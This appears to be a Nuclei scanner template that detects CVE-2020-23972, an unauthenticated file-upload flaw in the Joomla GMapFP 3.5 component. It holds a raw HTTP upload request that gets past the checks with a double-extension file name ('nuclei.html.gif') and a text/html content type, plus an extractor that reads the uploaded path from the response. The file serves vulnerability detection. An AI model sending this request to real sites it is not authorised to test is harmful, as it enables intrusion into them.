id: cve-2020-23972
info:
  author: dwisiswant0
  description: 'An attacker can access the upload function of the application

    without authenticating to the application and also can upload

    files due the issues of unrestricted file upload which can be

    bypassed by changing Content-Type & name file too double ext.

    '
  name: Joomla! Component GMapFP 3.5 - Unauthenticated Arbitrary File Upload
  reference: https://www.exploit-db.com/exploits/49129
  severity: high
  tags: cve,cve2020,joomla
requests:
- extractors:
  - part: body
    regex:
    - window\.opener\.(changeDisplayImage|addphoto)\("(.*?)"\);
    type: regex
  payloads:
    component:
    - com_gmapfp
    - comgmapfp
  raw:
  - "POST /index.php?option=\xA7component\xA7&controller=editlieux&tmpl=component&task=upload_image\
    \ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS\n\
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n\
    Referer: {{BaseURL}}\nConnection: close\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\n\
    Content-Disposition: form-data; name=\"option\"\n\ncom_gmapfp\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\n\
    Content-Disposition: form-data; name=\"image1\"; filename=\"nuclei.html.gif\"\n\
    Content-Type: text/html\n\nprojectdiscovery\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\n\
    Content-Disposition: form-data; name=\"no_html\"\n\nno_html\n------WebKitFormBoundarySHHbUsfCoxlX1bpS--\n"
